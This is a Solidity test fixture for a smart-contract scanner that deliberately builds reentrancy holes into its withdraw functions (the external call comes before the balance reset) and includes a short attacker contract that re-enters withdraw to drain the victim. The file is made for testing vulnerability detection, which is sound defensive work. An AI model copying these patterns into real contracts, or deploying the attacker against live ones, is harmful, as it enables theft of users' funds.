// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyVulnerable
 * @notice This contract demonstrates CRITICAL reentrancy vulnerabilities
 * @dev INTENTIONALLY VULNERABLE - For testing Web3CRIT Scanner
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @notice Classic Reentrancy - External call before state update
     * @dev VULNERABLE: State updated AFTER external call
     */
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update happens AFTER external call
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice Cross-function reentrancy vulnerability
     * @dev VULNERABLE: transfer() can be called during withdraw's external call
     */
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    /**
     * @notice Read-only reentrancy in view function
     * @dev VULNERABLE: Returns stale balance during reentrancy
     */
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }

    /**
     * @notice Another vulnerable withdrawal function
     * @dev VULNERABLE: Uses send() which can be reentered
     */
    function withdrawViaSend() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // VULNERABILITY: send() before state update
        payable(msg.sender).send(amount);
        balances[msg.sender] = 0;
    }

    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    receive() external payable {
        deposit();
    }
}

/**
 * @title Attacker Contract
 * @notice Example attacker contract that exploits reentrancy
 */
contract ReentrancyAttacker {
    ReentrancyVulnerable public victim;
    uint256 public attackCount;

    constructor(address _victim) {
        victim = ReentrancyVulnerable(payable(_victim));
    }

    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (attackCount < 5 && address(victim).balance > 0) {
            attackCount++;
            victim.withdraw();
        }
    }
}
